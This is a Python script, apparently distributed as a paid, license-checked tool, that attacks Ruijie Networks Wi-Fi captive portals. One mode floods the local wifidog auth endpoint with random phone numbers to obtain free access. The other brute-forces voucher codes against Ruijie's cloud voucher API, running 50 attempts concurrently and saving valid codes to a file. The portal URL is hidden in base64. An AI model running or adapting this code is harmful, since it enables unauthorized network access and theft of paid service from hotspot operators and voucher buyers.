import os
import re
import sys
import time
import ping3
import base64
import random
import string
import asyncio
import aiohttp
import hashlib
import argparse
import requests
from datetime import datetime

# --- UI COLORS ---
w = "\033[1;00m"
g = "\033[1;32m"
y = "\033[1;33m"
r = "\033[1;31m"
b = "\033[1;34m"

# --- UI & LOGO ---
def Logo():
    os.system("clear" if os.name == "posix" else "cls")
    logo = f"""{r}  __  __  ____  ______     ____  _ 
 |  \/  |/ __ \|  ____|   |  _ \| |
 | \  / | |  | | |__      | |_) | |
 | |\/| | |  | |  __|     |  _ <| |
 | |  | | |__| | |____    | |_) |_|
 |_|  |_|\____/|______|   |____/(_)
                                   
{g}              Created by MOEYU [STABLE V3]{w}"""
    print(logo)
    print(f"{y}-" * 45)
    print(f"{w}[♠️] Developer: Moe Yu")
    print(f"{w}[♣️] Telegram: @starlink112")
    print(f"{w}[♦️] Status: Licensed (Fixed ID)")
    print(f"{y}-" * 45)

# --- SECURITY SYSTEM (FIXED ID & NO CACHE) ---
def get_hwid():
    """ဖုန်းရဲ့ Fixed ID ကို ထုတ်ယူခြင်း (တစ်ခါ run တိုင်း မပြောင်းပါ)"""
    try:
        user = os.environ.get('USER', 'default')
        cpu = str(os.cpu_count())
        # MAC မသုံးဘဲ Environment data ကိုပဲသုံး၍ ID ထုတ်ခြင်း
        raw_id = f"{user}-{cpu}-MOEYU-STABLE"
        fixed_id = hashlib.sha1(raw_id.encode()).hexdigest()[:12].upper()
        return f"MY-{fixed_id}"
    except:
        return "MY-UNKNOWN-ID"

def check_license():
    Logo()
    my_id = get_hwid()
    # သင်၏ GitHub Raw URL
    key_url = "https://raw.githubusercontent.com/hhtethtet277-svg/moeyu/refs/heads/main/key.txt"
    
    print(f"{b}[*] Your ID: {y}{my_id}{w}")
    print(f"{b}[*] Checking license status...{w}")
    
    try:
        # Cache မမိစေရန် Random Parameter ထည့်ခြင်း
        response = requests.get(f"{key_url}?v={random.randint(1000, 9999)}", timeout=10)
        
        if response.status_code != 200:
            print(f"{r}[!] Connection Error (Status: {response.status_code}){w}")
            sys.exit()
            
        lines = response.text.splitlines()
        is_verified = False
        
        for line in lines:
            if "|" in line:
                db_id, exp_date = line.split("|")
                # Space တွေပါခဲ့ရင် ဖယ်ထုတ်ရန် strip() သုံးခြင်း
                if db_id.strip() == my_id:
                    is_verified = True
                    expiry = datetime.strptime(exp_date.strip(), "%Y-%m-%d")
                    if datetime.now() < expiry:
                        print(f"{g}[+] Verified Successfully! Expires: {exp_date}{w}")
                        time.sleep(2)
                        return True
                    else:
                        print(f"{r}[!] Your license expired on {exp_date}{w}")
                        sys.exit()
        
        if not is_verified:
            print(f"{r}[!] ID Not Registered in Server!{w}")
            print(f"{y}[>] Send this ID to Admin: {w}{my_id}")
            # Debug: Server ထဲမှာ လက်ရှိရှိနေတဲ့ စာသားကိုပါ ပြပေးခြင်း
            print(f"\n{b}[Server Data Debug]:\n{w}{response.text}")
            sys.exit()
            
    except Exception as e:
        print(f"{r}[!] Security Error: {str(e)}{w}")
        sys.exit()

# --- CORE LOGIC (INTERNET & CODE) ---
async def get_sid(session, url):
    try:
        async with session.get(url) as r:
            return re.search(r"sessionId=([a-zA-Z0-9]+)", str(r.url)).group(1)
    except: return None

class InternetAccess:
    def __init__(self):
        self.url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()

    async def execute(self):
        Logo()
        async with aiohttp.ClientSession() as s:
            sid = await get_sid(s, self.url)
            while True:
                try:
                    params = {'token': sid, 'phoneNumber': "".join(random.choice(string.digits) for _ in range(6))}
                    async with s.post('http://192.168.0.1:2060/wifidog/auth?', params=params) as res:
                        ping_res = await asyncio.to_thread(ping3.ping, 'google.com')
                        ms = int(ping_res*1000) if ping_res else '??'
                        print(f"{w}[{time.strftime('%H:%M:%S')}] Status: {g}{res.status}{w} | Ping: {g}{ms}{w}ms")
                except: pass
                await asyncio.sleep(1)

class VoucherCrack:
    def __init__(self, l=6, s=50):
        self.l, self.s = l, s
        self.url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()

    async def check_v(self, s, sid, v):
        try:
            api = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
            async with s.post(api, json={"accessCode": v, "sessionId": sid, "apiVersion": 1}) as res:
                if 'logonUrl' in await res.text():
                    print(f"\n{g}[SUCCESS] Code Found: {v}{w}")
                    with open("success.txt", "a") as f: f.write(v + "\n")
                else:
                    print(f"{w}[*] Testing: {y}{v}{w}", end="\r")
        except: pass

    async def execute(self):
        Logo()
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.s)) as s:
            sid = await get_sid(s, self.url)
            while True:
                tasks = [self.check_v(s, sid, "".join(random.choice(string.digits) for _ in range(self.l))) for _ in range(50)]
                await asyncio.gather(*tasks)

# --- MAIN RUNNER ---
def main():
    check_license()
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", choices=["code", "internet"], required=True)
    parser.add_argument("-l", "--length", type=int, default=6)
    parser.add_argument("-s", "--speed", type=int, default=50)
    args = parser.parse_args()

    try:
        if args.option == "internet":
            asyncio.run(InternetAccess().execute())
        else:
            asyncio.run(VoucherCrack(l=args.length, s=args.speed).execute())
    except KeyboardInterrupt:
        print(f"\n{r}[!] Process Interrupted.{w}")

if __name__ == "__main__":
    main()
